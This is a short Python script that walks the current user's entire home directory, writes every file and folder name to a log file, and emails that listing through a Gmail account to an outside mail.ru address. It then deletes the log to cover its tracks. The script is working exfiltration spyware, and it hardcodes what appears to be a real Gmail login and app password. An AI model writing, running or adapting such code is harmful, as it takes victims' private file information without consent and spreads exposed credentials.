import os, smtplib, time
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

username = os.getlogin()
os.chdir(f"/Users/{username}/")
a = "/Users/%s/" % (username)

def convertTuple(tup): 
    str = ''.join(tup) 
    return str

with open('log.txt', "w", encoding="utf-8") as file:
    for dirname in os.walk(os.getcwd()):
        string = convertTuple(str(dirname))
        file.write(string)
        file.write("\n")

file.close()

path = os.path.realpath(f"/Users/{username}/log.txt")
os.startfile(path)

file = open("log.txt", encoding="utf-8")
data = file.read()

smtp_ssl_host = 'smtp.gmail.com'
smtp_ssl_port = 465
username = 'robob3132@gmail.com'
password = 'uiapmwvbalfcktrj'
sender = f'{username}\'s PC'
targets = ["tim101206@mail.ru"]

msg = MIMEText(data)
msg['Subject'] = f'{os.getlogin()}\'s files list'
msg['From'] = sender
msg['To'] = ', '.join(targets)


#Sends email
server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
server.login(username, password)
server.sendmail(sender, targets, msg.as_string())
server.quit()
file.close()

os.remove("log.txt")